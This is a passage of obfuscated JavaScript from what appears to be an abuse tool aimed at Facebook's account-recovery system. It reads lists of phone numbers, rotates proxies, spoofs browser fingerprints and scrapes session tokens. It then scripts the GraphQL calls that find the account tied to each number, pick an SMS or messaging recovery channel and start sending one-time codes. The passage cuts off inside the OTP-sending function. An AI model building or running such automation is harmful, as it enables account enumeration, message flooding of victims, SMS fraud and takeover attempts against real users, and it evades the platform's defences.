          }
        });
      v310.on("error", v307), v310.on("timeout", () => {
        v310.destroy(), v307(new Error("timeout"));
      }), v310.end();
    }
  });
}
function graphqlPost(v324, v325, v326 = 15000, v327 = undefined, v328 = "www.facebook.com") {
  const v329 = v327 !== null && v327 !== undefined ? v327 : getProxy();
  const v330 = v328 || "www.facebook.com";
  if (v329) {
    const v331 = {
      ...v325
    };
    return proxyHttpsRequest(v329, {
      'hostname': v330,
      'path': "/api/graphql/",
      'method': "POST",
      'headers': v331
    }, v324.toString(), v326);
  }
  return new Promise((v332, v333) => {
    {
      const v334 = v324.toString(),
        v335 = {
          'hostname': v330,
          'port': 0x1bb,
          'path': "/api/graphql/",
          'method': "POST",
          'headers': {
            ...v325,
            'Content-Length': Buffer.byteLength(v334),
            'Accept-Encoding': "gzip, deflate, br"
          },
          'timeout': v326
        },
        v336 = https.request(v335, v337 => {
          const v338 = [];
          v337.on("data", v339 => {
            v338.push(v339);
            trackBytes(v339.length);
          });
          v337.on("error", v340 => {
            try {
              v333(v340);
            } catch (v341) {}
          }), v337.on("end", () => {
            {
              let v342 = Buffer.concat(v338);
              const v343 = v337.headers["content-encoding"];
              if (v343 === "gzip") try {
                v342 = zlib.gunzipSync(v342);
              } catch (v344) {} else {
                if (v343 === "deflate") {
                  try {
                    v342 = zlib.inflateSync(v342);
                  } catch (v345) {}
                } else {
                  if (v343 === 'br') try {
                    v342 = zlib.brotliDecompressSync(v342);
                  } catch (v346) {}
                }
              }
              v332({
                'status': v337.statusCode,
                'data': v342.toString(),
                'headers': v337.headers
              });
            }
          });
        });
      v336.on("error", v333), v336.on("timeout", () => {
        v336.destroy(), v333(new Error("timeout"));
      }), trackBytes(v334.length), v336.write(v334), v336.end();
    }
  });
}
async function seedSession(v347 = null, v348 = null, v349 = null, v350 = () => {}) {
  return new Promise((v351, v352) => {
    const v353 = v347 !== null ? v347 : proxyManager.hasProxies ? proxyManager.getNext() : null,
      v354 = v349 || {
        'host': "www.facebook.com",
        'locale': "en_US",
        'lang': "en-US,en;q=0.9"
      };
    if (v353) {
      const v355 = v348 || globalUA,
        v356 = v354.host,
        fn9 = (v357, v358, v359) => {
          proxyHttpsRequest(v353, {
            'hostname': v357,
            'path': v358,
            'method': "GET",
            'headers': {
              'User-Agent': v355.userAgent,
              'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
              'Accept-Language': v354.lang,
              'Accept-Encoding': "gzip, deflate, br",
              'Referer': "https://" + v357 + "/login/identify/",
              'Upgrade-Insecure-Requests': '1',
              ...v355.clientHints,
              'sec-fetch-dest': "document",
              'sec-fetch-mode': "navigate",
              'sec-fetch-site': "same-origin",
              'sec-fetch-user': '?1'
            }
          }, null, 15000).then(v360 => {
            {
              if ((v360.status === 301 || v360.status === 302) && v360.location && v359 > 0) {
                let v361 = v357,
                  v362 = v360.location;
                if (v360.location.startsWith("http")) try {
                  {
                    const v363 = new URL(v360.location);
                    v361 = v363.hostname, v362 = v363.pathname + v363.search;
                  }
                } catch (v364) {}
                fn9(v361, v362, v359 - 1);
              } else v354.host = v357, fn8(v360.data, v360.status, v360.headers);
            }
          })["catch"](v352);
        };
      fn9(v356, "/login/identify/", 5);
    } else {
      {
        const v365 = v348 || globalUA,
          v366 = v354.host,
          fn10 = (v367, v368, v369) => {
            {
              const v370 = {};
              v370.hostname = v367, v370.port = 0x1bb, v370.path = v368, v370.method = "GET", v370.headers = {
                'User-Agent': v365.userAgent,
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                'Accept-Language': v354.lang,
                'Accept-Encoding': "gzip, deflate, br",
                'Referer': "https://" + v367 + "/login/identify/",
                'Upgrade-Insecure-Requests': '1',
                'connection': "keep-alive",
                ...v365.clientHints
              }, v370.timeout = 0x3a98, v370.headers["sec-fetch-dest"] = "document", v370.headers["sec-fetch-mode"] = "navigate", v370.headers["sec-fetch-site"] = "same-origin", v370.headers["sec-fetch-user"] = '?1';
              const v371 = v370,
                v372 = https.request(v371, v373 => {
                  if ((v373.statusCode === 301 || v373.statusCode === 302) && v373.headers.location && v369 > 0) {
                    v373.resume();
                    let v374 = v367,
                      v375 = v373.headers.location;
                    if (v373.headers.location.startsWith("http")) try {
                      {
                        const v376 = new URL(v373.headers.location);
                        v374 = v376.hostname, v375 = v376.pathname + v376.search;
                      }
                    } catch (v377) {}
                    fn10(v374, v375, v369 - 1);
                  } else {
                    {
                      const v378 = [];
                      v373.on("data", v379 => v378.push(v379)), v373.on("error", v380 => {
                        try {
                          v352(v380);
                        } catch (v381) {}
                      }), v373.on("end", () => {
                        let v382 = Buffer.concat(v378);
                        const v383 = v373.headers["content-encoding"];
                        if (v383 === "gzip") {
                          try {
                            v382 = zlib.gunzipSync(v382);
                          } catch (v384) {}
                        } else {
                          if (v383 === "deflate") {
                            try {
                              v382 = zlib.inflateSync(v382);
                            } catch (v385) {}
                          } else {
                            if (v383 === 'br') try {
                              v382 = zlib.brotliDecompressSync(v382);
                            } catch (v386) {}
                          }
                        }
                        v354.host = v367;
                        fn8(v382.toString(), v373.statusCode, v373.headers);
                      });
                    }
                  }
                });
              v372.on("timeout", () => {
                v372.destroy(), v352(new Error("Timeout seeding session"));
              }), v372.on("error", v387 => {
                v352(v387);
              }), v372.end();
            }
          };
        fn10(v366, "/login/identify/", 5);
      }
    }
    function fn8(v388, v389, v390 = {}) {
      {
        if (v389 !== 200) {
          v352(new Error("Session seed HTTP " + v389));
          return;
        }
        const v391 = {},
          v392 = v390["set-cookie"] || v390["Set-Cookie"];
        if (v392) {
          const v396 = Array.isArray(v392) ? v392 : [v392];
          v396.forEach(v397 => {
            const v398 = v397.split(';')[0].split('=');
            if (v398.length >= 2) {
              const v399 = v398[0].trim(),
                v400 = v398.slice(1).join('=').trim();
              v391[v399] = v400;
            }
          });
        }
        if (v388 && v388.includes("datr")) {
          {
            const v401 = v388.match(/"datr":"([^"]+)"/);
            if (v401) v391.datr = v401[1];
          }
        }
        !v391.datr && (v391.datr = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15));
        const fn11 = v402 => {
            const v403 = v388.match(v402);
            return v403 ? v403[1] : '';
          },
          v393 = {};
        v393.lsd = fn11(/"LSD",\[\],\{"token":"([^"]+)"/) || fn11(/name="lsd"\s+value="([^"]+)"/) || fn11(/"token":"([^"]+)"/) || fn11(/\"lsd\":\{\"token\":\"([^"]+)\"/), v393.hsi = fn11(/"hsi":"(\d+)"/) || fn11(/"hsi":(\d+)/) || String(Math.floor(Date.now())), v393.rev = fn11(/"server_revision":(\d+)/) || "10111213", v393.fb_dtsg = fn11(/"dtsg":\{"token":"([^"]+)"/) || fn11(/name="fb_dtsg" value="([^"]+)"/) || '', v393.spinB = fn11(/"__spin_b":"([^"]+)"/) || "trunk", v393.spinT = fn11(/"__spin_t":(\d+)/) || String(Math.floor(Date.now() / 1000)), v393.__hs = fn11(/"__hs":"([^"]+)"/) || "20000.HYP:comet_loggedout_pkg.2.1.0.2.1", v393.__comet_req = fn11(/"__comet_req":(\d+)/) || '15', v393.__ccg = fn11(/"__ccg":"([^"]+)"/) || "EXCELLENT", v393.__dyn = fn11(/"__dyn":"([^"]+)"/) || '', v393.__csr = fn11(/"__csr":"([^"]+)"/) || '', v393.hsi = v393.hsi || fn11(/"hsi":(\d+)/) || '0', v393.__s = fn11(/"__s":"([^"]+)"/) || fn11(/"session_id":"([^"]+)"/) || '', v393.initialCipher = fn11(/"ci":"([^"]+)"/) || fn11(/[?&]ci=([A-Za-z0-9_\-]+)/) || '', v393.__hsdp = fn11(/"__hsdp":"([^"]+)"/) || '', v393.__hblp = fn11(/"__hblp":"([^"]+)"/) || '', v393.__sjsp = fn11(/"__sjsp":"([^"]+)"/) || '', dbg("[SESSION] lsd=" + (v393.lsd ? '✓' : '✗') + " rev=" + v393.rev + " hs=" + v393.__hs + " dtsg=" + (v393.fb_dtsg ? '✓' : '✗') + " hsdp=" + (v393.__hsdp ? '✓(' + v393.__hsdp.length + ')' : '✗') + " hblp=" + (v393.__hblp ? '✓' : '✗') + " sjsp=" + (v393.__sjsp ? '✓' : '✗'));
        if (!v393.lsd) {
          v352(new Error("Failed to initialize session"));
          return;
        }
        let v394 = 0;
        const v395 = v393.lsd || '';
        for (let v404 = 0; v404 < v395.length; v404++) v394 += v395.charCodeAt(v404);
        v351({
          ...v393,
          'jazoest': '2' + v394,
          'cookies': v391,
          'cookieHeader': Object.entries(v391).map(([v405, v406]) => v405 + '=' + v406).join(';\x20'),
          'hostCtx': v354
        });
      }
    }
  });
}
function loadNumbers(v407) {
  if (!v407 || !fs.existsSync(v407)) {
    process.exit(1);
  }
  const v408 = fs.readFileSync(v407, "utf8").split(/\r?\n/).map(v409 => v409.trim()).filter(v410 => v410 && /^\+?\d{7,15}$/.test(v410));
  for (let v411 = v408.length - 1; v411 > 0; v411--) {
    {
      const v412 = Math.floor(Math.random() * (v411 + 1));
      [v408[v411], v408[v412]] = [v408[v412], v408[v411]];
    }
  }
  return v408;
}
function buildParams(v413, v414, v415, v416, v417, v418, v419 = null) {
  const v420 = v419 && v419.includes("CodeEntry"),
    v421 = "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D85m1mzXwae4UaEW0LobrwmE2eUlwhE2FBwxw4BwqEGdwtU2ewbS1LwTwNwLweq1Iwqo4eEgwro9o5umEb8uwm81fE0Vy3mdw",
    v422 = "jN4Ih8l8RkO-SKXrDULqnhBQmx2GJ4QV48Q8CQmeAufDHh8HzaiQEKmiGCQVKhmV2ox2WuOcOnGQJ4STKKjJq-Hyknlolxa7EaElwQwVjzUeUkG7U-i69ohwj8arGu7keXUc48wXwUwEwspF99E1C8eo2yg3ewn80hTw6sBx2U4Gm2GE4m2y3O0sqi02nS03b11F6VQ03du3AxUx00Bww2qo0wem09iw0eVG0gsE04jIw08Rk0K4036u00Bppo0iyw49KgC063C2y08cw1jx2848w0hfCyp8",
    v423 = "gtB0FAuO0wji3e0K8mp30So1lUtw8216g9Ed20aq08NwmE1sE5m016ew3kU0zC",
    v424 = "0dm0U8y0ra0NU5S7o2aw5HBwb-1qw5Owlo5i1WyU881hU1oE0dPEnw4Rw27o0zC3m4bwiouwn80G60SU2Yw21EK0RE",
    v425 = "gtB0C8F7Iw84QwPw4io1lUtw8216g9Ed20";
  const v426 = "7xeUjG4E4e5U5ObwyyVp4Unxim2q1DxiFGxK7oG1-zEdF8iBxa361MwFwJzUS8xe1Bw8i7oqx611wno2wgaU7i2qq1eCyUhxR162-8G6kE8Ro4uUfo2lxF122yfBwWxecAwXwEwgonzoO0AE2qwgEhwGxu786a6oowv89k2CcAwOwAwgoszUeUmwvC6UgzEtAx50KK2efK1YwCxe68hzE2ZwzyrwmEiwm8kzu5o4qu1dwkVokylK2W1RwrUO4ohz8ek9zo8U5e3C1jhU2RwhoapocobGAyo884K6o9EbrxS9wr8aEbAeg-3aEgADwBz8a-26U5umEb8uzpo4d08q1rxC11xS3S1EyUd8-2m2BxacxG1dwiE6e9Dxy1iGEdUb8-5XK5oLwSw",
    v427 = "jN4Ih8l8jid94KSy5UwA_iPkkmBeLt4irQrLlrqhJEGnl9aiytaA-iGqlkAqQiLi8Z9XV5rH9y4FbFX8P9tkDQjruW-CDRqKVknlpagDhHlvdJaCpGbmcy-WgK4eTKt2K6884U-h7zlgq8Am_iKeLBgGiimcBLl7h8ngWqaA-he78OWDxNGbXUhAzby5GAcyCeUXGuczUSEa8dMN1iKxG3Y16tAf7F2Opls4Ij3kPDK4AbFAPd2pfhpawBhdyF9x4aUozAeSAyyDpreQhCi6OvgF8IYgKigz6ShgB2T2pGFUx3Elx6OFaH6Pdd-iT4rEwm57A1whCgG4UQUS9icxs2RcwkLb4a22i7OxHzAjamawUglG8x6awEwS8gFrGaBcEyljgyeACj45hPpFAdCeGLlEuFp9AN5i5Ekd6rq5sCBZ8pqf492VW1mwn9K4rHRi7NcfgaZMNWc427ByVbx3Ajh2B_iAQ9pp4cBGiiiHzEiuEhCKay8gGmqucz9qU3DwdWi0ne1D80YhCbgW880J86222Q5UaF8O327iw5wEiyKKEjvZe9H4ajGVe4oozUmG10wX8n5ohhW_9bum84Aw57x23e0uq7gRAC6G1GnjBUG5XcBYgaGh8Faz8IpJkpBF4y410yVurgvwk67o3twdK0Zr41a3G4AoIxodE3tKhaHhVOiqxEznxiqapInbCzxh9-aRw8G1cg3qzQiaxaFcInAGJeKE720FA6ArDglw9-1kg3c80KpEZ3kJm3emOk8Dyiky4xeUsEVoLB28O4nl2Ai79ER91h7SSh5g11UGcqyUC1hwVwFaV8b84W9w9Ph8fEGO0gmEiyl8cKiFFUVQ5Q8mt6e4kZ1-48eE16o9EwN4VQdyk1ewjk0HO1mE3ewV8u8g1j0hMA5AxKagdwTEbw9nho0Fq0Jo0wHAxK0g62609Fwr8L80O60KFo8o3IyE2uzr4U62781hE1nJd7Q6Ud8lwkocohykm1awRy8550ei0iaueK0Eo5y0ta3W9kM2jo13Q9yQ9U4Ku6VfxSEN02Qo22wi82Yw26U4W0CGw62G0UUmxNFo9-0hO0XE0Dm6k2p2E5O261Bg9u1EwEwwxWi0iCmimUtaz0-ABwxxa0nBwtUaoK3agwaA0gNxi3m1fwwbD-JwExG0coBF0e68Ag522qu9y_m1ByoC0lLAwYUhQ6Cibxa1GyEO6o24w21E6K321oo5GeyEG19G2y4obEDmu1aUloJ0DgkpoC2J0oy2E13LAxifC-4XxLWVoW5oy0fkwau83zPn5xLc0E309S0N4ayQeypE4-swV1m2aF4exi6Ugg3Ra363K0Ro1fu9w23oly2pEJ3Fyw3uwdMXwBhONqxqB0rqw6Uk0rE1qm0oIzAyE1PonwTikimRyAlXwKw6zwJDyo4S7Upw6-w5twbl08K2N08ubwd6582GwHzK8yAewHxai3y26h04sxai0Eo7i2G0a1w7dg0De0pC0LE2UwGg2xQ3m0ESl1G3-0KUa80LO9mA13DxOq3yq8weV04Ew1iC2K3wNEJp0E07iE2Cxxw1Bha6k7cg0g60A80Ckdz1P8mEJr2E2OBw45w6ko3dw4ke7821adg7iV2o18Unws85Dgbw1KE65wwDw8q78txqdwhM6-1HE6Us7iyg1KM2VwGgy128co7oP1uEoNoRgdwB1KAV84t1yq11k3s5rxO68sk1JGu2i2mq9AwcG0x01KU",
    v428 = "gtB0GdWa21d8cWhonSh1KNic2-2K5icWgcC3-2yU2iwDxp1u7oQ2697x42iGg84im9wA83y3Z3Q6U3Jg7WU2_wmEb9bwIo13o5mc80tq0qe1mwso1jbw9K682uG1dw44wjoiwCwaWqJ0cLwRxOFokx90Tx51m0w8jwbq0_9o6q0xQ13xS3u1Pg1-o7a0bwwkEe81Ho660Qk36bwDwAU1aHw3gU1lFotwcq0jCu0UES1ow",
    v429 = "3E2gwRxi0OUy0ra0NU5S7o5O2S0XE7PK0LU5G5Xx2iUb60gS1lz20h87Gbwwwby1Ogqx20BE2Wxy22262e7omx27U6i4o7i2qU5K3iaxy1dyoiUC26nwDDwLK0GE4i1dzWwCwpoeESqhzFoyl3E6XGm7e3m79Q4Q4A2rw5YCwUhU42awk8rwQwVwuEN1CaxW2i0F40Eo2HwtVolxu698vwQwkEnx1e11x6dzEaUgzoiQ0E86ii5U4y26m4UnBxd0fufxO5oqwnEdQ3i4bxa79EixWEqwNz98qF0NyU9Q2fgdkqvBwXx20zHg4O1PzUaU4Gq2u2m0L8jCCw9qbK7UcE33z8pyVp88povJ3EW5U4y2O8yE9E8k3PwJx94xC17wsFE4u9w8K3a1NyE",
    v430 = "gtB0C8F7Iw84QwPyonwFiwYwgpEf60iu2-7oQ2697xy13F0wh8d20u8gg1yrw",
    v431 = new URLSearchParams();
  v431.set('av', '0'), v431.set("__user", '0'), v431.set("__a", '1'), v431.set("__comet_req", v413.__comet_req || '15'), v431.set("__hs", v413.__hs || "20657.HYP:comet_loggedout_pkg.2.1...0"), v431.set("__hsi", v413.hsi), v431.set("__rev", v413.rev), v431.set("__spin_r", v413.rev), v431.set("__spin_b", v413.spinB), v431.set("__spin_t", v413.spinT);
  v431.set("__dyn", v420 ? v413.__dyn_code || v413.__dyn || v426 : v413.__dyn || v421), v431.set("__csr", v420 ? v413.__csr_code || v413.__csr || v427 : v413.__csr || v422), v431.set("__ccg", v413.__ccg || "EXCELLENT"), v431.set("__s", v420 ? v413.__s_code || v413.__s || '' : v413.__s || '');
  const v432 = v420 ? v413.__hsdp_code || (v413.__hsdp && !v413.__hsdp.startsWith(':') ? v413.__hsdp : v428) : v413.__hsdp && !v413.__hsdp.startsWith(':') ? v413.__hsdp : v423,
    v433 = v420 ? v413.__hblp_code || (v413.__hblp && !v413.__hblp.startsWith(':') ? v413.__hblp : v429) : v413.__hblp && !v413.__hblp.startsWith(':') ? v413.__hblp : v424,
    v434 = v420 ? v413.__sjsp_code || (v413.__sjsp && !v413.__sjsp.startsWith(':') ? v413.__sjsp : v430) : v413.__sjsp && !v413.__sjsp.startsWith(':') ? v413.__sjsp : v425;
  if (v432) v431.set("__hsdp", v432);
  if (v433) v431.set("__hblp", v433);
  if (v434) v431.set("__sjsp", v434);
  v431.set("__req", (v413.__req++).toString(16)), v431.set("__aaid", '0'), v431.set("__crn", v419 || "comet.fbweb.CometCAAAccountSearchRoute"), v431.set("qpl_active_flow_ids", "516759801"), v431.set("dpr", '1'), v431.set("lsd", v413.lsd), v431.set("jazoest", v413.jazoest);
  if (v413.fb_dtsg) v431.set("fb_dtsg", v413.fb_dtsg);
  return v431.set("fb_api_caller_class", "RelayModern"), v431.set("fb_api_req_friendly_name", v415), v431.set("server_timestamps", "true"), v431.set("variables", JSON.stringify(v416)), v431.set("doc_id", v414), v431.set("fb_api_analytics_tags", JSON.stringify(["qpl_active_flow_ids=516759801"])), v431;
}
function buildHeaders(v435, v436, v437, v438, v439) {
  const v440 = v436 || globalUA,
    v441 = v438 || "en-US,en;q=0.9",
    v442 = v439 || "https://www.facebook.com/login/identify/";
  return {
    'Content-Type': "application/x-www-form-urlencoded",
    'Accept': "*/*",
    'Accept-Encoding': "gzip, deflate, br",
    'Accept-Language': v441,
    'Cookie': v435.cookieHeader,
    'User-Agent': v440.userAgent,
    'Referer': v442,
    'Origin': "https://www.facebook.com",
    'Priority': "u=1, i",
    'X-FB-LSD': v435.lsd,
    'X-ASBD-ID': "359341",
    'X-FB-Friendly-Name': v437 || "unknown",
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    ...v440.clientHints
  };
}
async function httpsGetPageWithRedirects(v443, v444, v445 = 15000, v446 = "www.facebook.com", v447 = null, v448 = null, v449 = null, v450 = 5) {
  let v451 = v446 || "www.facebook.com",
    v452 = v443.startsWith("http") ? (() => {
      try {
        {
          const v458 = new URL(v443);
          return v451 = "www.facebook.com", v458.pathname + v458.search;
        }
      } catch (v459) {
        return v443;
      }
    })() : v443,
    v453 = v449 || "https://" + v451 + "/login/identify/";
  const v454 = {};
  (v444 || '').split(';').forEach(v460 => {
    {
      const v461 = v460.indexOf('=');
      if (v461 < 0) return;
      v454[v460.slice(0, v461).trim()] = v460.slice(v461 + 1).trim();
    }
  });
  let v455 = null;
  for (let v462 = 0; v462 < v450; v462++) {
    const v463 = Object.entries(v454).map(([v468, v469]) => v468 + '=' + v469).join(';\x20'),
      v464 = v448 || globalUA,
      v465 = {
        'Cookie': v463,
        'User-Agent': v464.userAgent,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'Accept-Language': v448 && v448.hostCtx ? v448.hostCtx.lang : "en-US,en;q=0.9",
        'Accept-Encoding': "gzip, deflate, br",
        'Referer': v453,
        'Upgrade-Insecure-Requests': '1',
        ...v464.clientHints
      };
    v465["sec-fetch-dest"] = "document", v465["sec-fetch-mode"] = "navigate", v465["sec-fetch-site"] = "same-origin", v465["sec-fetch-user"] = '?1';
    const v466 = v465;
    v447 ? v455 = await proxyHttpsRequest(v447, {
      'hostname': v451,
      'path': v452,
      'method': "GET",
      'headers': v466
    }, null, v445) : v455 = await new Promise((v470, v471) => {
      const v472 = {};
      v472.hostname = v451, v472.port = 0x1bb, v472.path = v452;
      v472.method = "GET";
      v472.timeout = v445, v472.headers = v466;
      const v473 = v472,
        v474 = https.request(v473, v475 => {
          {
            const v476 = [];
            v475.on("data", v477 => v476.push(v477)), v475.on("end", () => {
              let v478 = Buffer.concat(v476);
              try {
                {
                  const v479 = v475.headers["content-encoding"];
                  if (v479 === "gzip") v478 = zlib.gunzipSync(v478);else {
                    if (v479 === "deflate") v478 = zlib.inflateSync(v478);else {
                      if (v479 === 'br') v478 = zlib.brotliDecompressSync(v478);
                    }
                  }
                }
              } catch (v480) {}
              v470({
                'status': v475.statusCode,
                'headers': v475.headers,
                'data': v478.toString(),
                'location': v475.headers.location || ''
              });
            }), v475.on("error", v471);
          }
        });
      v474.on("error", v471), v474.on("timeout", () => {
        v474.destroy();
        v471(new Error("GET timeout"));
      }), v474.end();
    });
    const v467 = v455.headers && v455.headers["set-cookie"];
    v467 && (Array.isArray(v467) ? v467 : [v467]).forEach(v481 => {
      const v482 = v481.split(';')[0].split('=');
      if (v482.length >= 2) {
        {
          const v483 = v482[0].trim(),
            v484 = v482.slice(1).join('=').trim();
          if (v484 !== "deleted" && !v484.startsWith("deleted;")) v454[v483] = v484;
        }
      }
    });
    if ((v455.status === 301 || v455.status === 302 || v455.status === 307) && v455.location) {
      v453 = "https://" + v451 + v452;
      let v485 = v455.location;
      if (v485.startsWith("http")) try {
        const v486 = new URL(v485);
        v451 = "www.facebook.com", v452 = v486.pathname + v486.search;
      } catch (v487) {
        v452 = v485;
      } else {
        v452 = v485;
      }
      cdbg("[GET REDIRECT] HTTP " + v455.status + " -> " + v451 + v452.slice(0, 60));
    } else {
      break;
    }
  }
  const v456 = Object.entries(v454).map(([v488, v489]) => v488 + '=' + v489).join(';\x20'),
    v457 = {};
  v457.status = v455.status, v457.headers = v455.headers;
  v457.data = v455.data;
  v457.cookieHeader = v456;
  return v457.cookieMap = v454, v457;
}
function parseResp(v490) {
  v490 = String(v490).replace(/^for \(;;\);/, '');
  try {
    return JSON.parse(v490);
  } catch (v491) {
    return null;
  }
}
function mergeCookies(v492, v493) {
  if (!v493) return;
  const v494 = v493["set-cookie"];
  if (!v494) return;
  const v495 = Array.isArray(v494) ? v494 : [v494],
    v496 = {};
  (v492.cookieHeader || '').split(';').forEach(v497 => {
    {
      const v498 = v497.indexOf('=');
      if (v498 < 0) return;
      v496[v497.slice(0, v498).trim()] = v497.slice(v498 + 1).trim();
    }
  }), v495.forEach(v499 => {
    const v500 = v499.split(';')[0].split('=');
    if (v500.length >= 2) v496[v500[0].trim()] = v500.slice(1).join('=').trim();
  }), v492.cookieHeader = Object.entries(v496).map(([v501, v502]) => v501 + '=' + v502).join(';\x20');
  dbg("[COOKIE MERGE] sfiu=" + (v496.sfiu ? '✓' : '✗') + " keys=" + Object.keys(v496).join(','));
}
async function searchAccount(v503, v504, v505, v506, v507, v508, v509) {
  const v510 = uuid(),
    v511 = uuid(),
    v512 = buildParams(v504, DOC_SEARCH, "CAAFBAccountSearchViewQuery", {
      'params': {
        'cipher_text': null,
        'context': "recover",
        'event_request_id': v511,
        'friend_name': '',
        'search_query': v503,
        'waterfall_id': v510
      }
    }, v507, v508),
    v513 = v509 || "https://www.facebook.com/login/identify/",
    v514 = await graphqlPost(v512, buildHeaders(v504, v506, "CAAFBAccountSearchViewQuery", v508, v513), 15000, v505, "www.facebook.com"),
    v515 = parseResp(v514.data);
  if (v514.status !== 200) return {
    'ok': false,
    'error': "HTTP " + v514.status
  };
  const v516 = {};
  v516.ok = false, v516.error = "Parse failed";
  if (!v515) return v516;
  if (v515.errors) {
    {
      dbg('+' + v503 + " GRAPHQL ERROR: " + JSON.stringify(v515.errors));
      const v520 = {};
      return v520.ok = false, v520.error = "GraphQL error", v520;
    }
  }
  const v517 = v515?.["data"]?.["caa_ar_fb_account_search"];
  if (!v517 || !v517.accounts || v517.accounts.length === 0) {
    dbg('+' + v503 + " SEARCH FAIL: no_account");
    const v521 = {};
    return v521.ok = false, v521.result = "no_account", v521;
  }
  dbg("[SEARCH] " + v517.accounts.length + " account(s) found");
  let v518 = v517.cipher || null;
  if (!v518 && v517.redirect_uri) {
    {
      const v522 = v517.redirect_uri.match(/[?&]ci=([^&]+)/);
      if (v522) v518 = v522[1];
    }
  }
  const v519 = {};
  v519.ok = true, v519.accounts = v517.accounts, v519.searchCipher = v518;
  return v519.redirectUri = v517.redirect_uri, v519.wfId = v510, v519.evId = v511, v519;
}
async function selectAccount(v523, v524, v525, v526, v527, v528, v529, v530, v531) {
  const v532 = buildParams(v526, DOC_SELECT, "useCAAAccountSearchSelectMutation", {
      'input': {
        'actor_id': '0',
        'client_mutation_id': '1',
        'access_flow_version': "pre_mt_behavior",
        'cipher': v524,
        'idx': v525
      }
    }, v529, v530),
    v533 = await graphqlPost(v532, buildHeaders(v526, v528, "useCAAAccountSearchSelectMutation", v530, v531 || "https://www.facebook.com/login/identify/"), 15000, v527, "www.facebook.com"),
    v534 = parseResp(v533.data);
  if (v533.status !== 200 || !v534 || v534.errors) return {
    'ok': false,
    'error': "selectAccount failed"
  };
  const v535 = v534?.["data"]?.["caa_ar_fb_search_select_account"],
    v536 = v535?.["select_uri"] || '',
    v537 = v536.match(/[?&]ci=([^&]+)/),
    v538 = v537 ? v537[1] : null;
  dbg("[SELECT] select_uri=" + v536.substring(0, 60) + " cipher=" + (v538 ? "..." + v538.slice(-8) : "NULL")), mergeCookies(v526, v533.headers);
  const v539 = {};
  v539.ok = true;
  return v539.selectCipher = v538, v539;
}
async function getInitiateView(v540, v541, v542, v543, v544, v545, v546) {
  const v547 = {};
  v547.cipher = v540;
  const v548 = {};
  v548.params = v547;
  const v549 = buildParams(v541, DOC_INITIATE, "CAAFBARInitiateViewPushableQuery", v548, v544, v545, "comet.fbweb.CometCAAARInitiateViewRoute"),
    v550 = await graphqlPost(v549, buildHeaders(v541, v543, "CAAFBARInitiateViewPushableQuery", v545, v546 || "https://www.facebook.com/login/identify/"), 15000, v542, "www.facebook.com"),
    v551 = parseResp(v550.data);
  dbg("[INITIATE] HTTP " + v550.status + " | parsed=" + !!v551 + " | errors=" + (v551?.["errors"] ? JSON.stringify(v551.errors[0]) : "none"));
  if (v550.status !== 200 || !v551 || v551.errors) return {
    'ok': false,
    'error': "initiateView failed"
  };
  mergeCookies(v541, v550.headers);
  const v552 = v551?.["data"]?.["caa_ar_fb_initiate_view"];
  dbg("[INITIATE] allow_display=" + v552?.["allow_display"] + " cipher=" + (v552?.["cipher"] ? '✓' : "NULL") + " opts=" + (v552?.["contactpoint_options"]?.["length"] || 0));
  const v553 = {};
  v553.ok = false, v553.error = "no initiate view";
  if (!v552) return v553;
  const v554 = v552.contactpoint_options || v552.contact_point_options || v552.recovery_options || [],
    v555 = v552.preselected_cp || null,
    v556 = v552.profiles || [];
  let v557 = v552.cipher_text || v552.cipher || v555?.["cipher_text"] || v555?.["cipher"] || null,
    v558 = "send_sms",
    v559 = null;
  if (v554.length > 0) {
    v559 = v554.find(v564 => {
      const v565 = (v564.key || v564.type || v564.method || v564.contact_type || '').toLowerCase();
      return v565.includes("sms") || v565.includes("phone") || v565.includes("mobile") || v565.includes("whatsapp") || v565.includes('wa') || v565.includes("viber");
    }) || v554[0];
    if (!v557) v557 = v559?.["cipher_text"] || v559?.["cipher"] || null;
  }
  if (!v557 && v556.length > 0) {
    for (const v566 of v556) {
      const v567 = v566.contact_points || v566.contactpoint_options || v566.contact_point_options || v566.recovery_options || [],
        v568 = v566.preselected_cp || null;
      if (!v557 && v568 && typeof v568 === "object") {
        {
          v557 = v568.cipher_text || v568.cipher || null;
          if (!v559) v559 = v568;
        }
      }
      for (const v569 of v567) {
        const v570 = (v569.key || v569.type || v569.method || v569.contact_type || '').toLowerCase(),
          v571 = v569.cipher_text || v569.cipher;
        !v559 && (v570.includes("sms") || v570.includes("phone") || v570.includes("mobile") || v570.includes("text") || v570.includes("whatsapp") || v570.includes("viber")) && (v559 = v569), v571 && !v557 && (v557 = v569.cipher_text || v569.cipher);
      }
      if (v557 && v559) break;
    }
  }
  if (!v559 && v556.length > 0) for (const v572 of v556) {
    {
      const v573 = v572.contact_points || v572.contactpoint_options || v572.contact_point_options || v572.recovery_options || [];
      v559 = v573.find(v574 => {
        const v575 = (v574.key || v574.type || '').toLowerCase();
        return v575.includes("sms") || v575.includes("phone") || v575.includes("mobile") || v575.includes("whatsapp");
      }) || v573[0] || null;
      if (v559) break;
    }
  }
  if (v559) v558 = v559.key || v559.type || v559.method || v559.contact_type || "send_sms";else typeof v552.preselected_cp === "string" && v552.preselected_cp && (v558 = v552.preselected_cp);
  dbg("[INITIATE] cipher=" + (v557 ? "..." + v557.slice(-8) : "NULL") + " method=" + v558 + " profiles=" + v556.length + " flatOpts=" + v554.length);
  const v560 = {};
  v560.ok = false, v560.error = "no cipher in initiate view";
  if (!v557) return v560;
  const v561 = v558 && v558.toLowerCase().startsWith("send_email"),
    v562 = {};
  v562.ok = false, v562.error = "no_sms";
  if (v561) return v562;
  const v563 = {};
  return v563.ok = true, v563.cipher = v557, v563.recoverMethod = v558, v563;
}
async function sendOTP(v576, v577, v578, v579, v580, v581, v582, v583, v584, v585) {
  const v586 = {};
  v586.actor_id = '0', v586.client_mutation_id = '2', v586.access_flow_version = "pre_mt_behavior", v586.cipher = v578, v586.event_request_id = v577, v586.recover_method = v579, v586.waterfall_id = v576;
  const v587 = {};
